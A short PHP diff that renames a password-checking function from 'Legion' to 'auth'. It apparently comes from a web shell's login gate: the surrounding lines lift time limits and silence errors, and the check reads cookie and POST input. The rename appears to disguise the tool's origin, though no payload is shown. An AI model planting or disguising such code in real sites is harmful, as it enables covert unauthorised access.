@@ -24,8 +24,8 @@ error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
 @set_time_limit(0);
 @clearstatcache();
 
-if(!function_exists('Legion')){
-	function Legion(){
+if(!function_exists('auth')){
+	function auth(){
 		if(isset($GLOBALS['pass']) && (trim($GLOBALS['pass'])!='')){
 			$c = $_COOKIE;
 			$p = $_POST;
@@ -61,7 +61,3 @@ if(!function_exists('Legion')){
 		}
 	}
 }
-
-
-
-
